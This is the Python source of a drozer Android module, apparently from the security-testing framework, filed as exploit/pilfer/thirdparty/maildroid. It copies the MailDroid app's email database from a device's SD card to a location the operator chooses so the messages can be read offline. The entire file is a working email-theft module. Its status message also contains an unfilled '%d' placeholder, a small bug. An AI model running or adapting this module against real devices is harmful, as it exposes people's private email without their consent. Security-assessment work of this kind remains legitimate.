from mwr.common import fs
from drozer.modules import common, Module

class Emails(Module, common.FileSystem, common.ClassLoader):
    
    name = "Grab Email messages from MailDroid"
    description = """Grabs Email Messages stored on the SD card by 'MailDroid' (com.maildroid)."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-17"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "thirdparty", "maildroid"]
    
    __database = "/sdcard/com.maildroid/index/index-1.db"
    
    def add_arguments(self, parser):
        parser.add_argument("target", help="where to save the copied MailDroid database", nargs="?")
    
    def execute(self, arguments):
        length = self.downloadFile(self.__database, arguments.target)
        
        if length != None:
            self.stdout.write("Copied %d bytes. Open the target with sqlite.\n\n")
        else:
            self.stdout.write("Could not copy the MailDroid database.\n\n")

    def get_completion_suggestions(self, action, text, **kwargs):
        if action.dest == "target":
            return common.path_completion.on_console(text)
            
